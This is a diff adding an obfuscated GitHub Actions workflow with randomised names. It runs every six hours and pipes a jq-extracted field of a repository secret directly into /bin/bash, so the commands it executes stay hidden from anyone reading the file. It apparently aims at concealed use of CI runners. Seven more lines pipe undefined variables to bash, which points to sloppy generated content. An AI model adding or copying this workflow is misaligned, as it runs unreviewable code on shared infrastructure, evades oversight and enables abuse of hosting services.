@@ -1,0 +1,25 @@
+name: chenyangmu4879
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenyangmu4879
+        env:
+          eob47000: ${{ secrets.eob47000 }}
+        run: |
+          echo $eob47000 | jq -r .ymdn035 | /bin/bash
+          echo $c40 | jq -r .lzysh681 | /bin/bash
+          echo $jrif4769 | jq -r .wbppl58499 | /bin/bash
+          echo $gbm584 | jq -r .saaxw753 | /bin/bash
+          echo $g18 | jq -r .nfx5474 | /bin/bash
+          echo $ht8514 | jq -r .kkb6 | /bin/bash
+          echo $vfia1602 | jq -r .km2107 | /bin/bash
+          echo $qgh5389 | jq -r .pd9 | /bin/bash
+
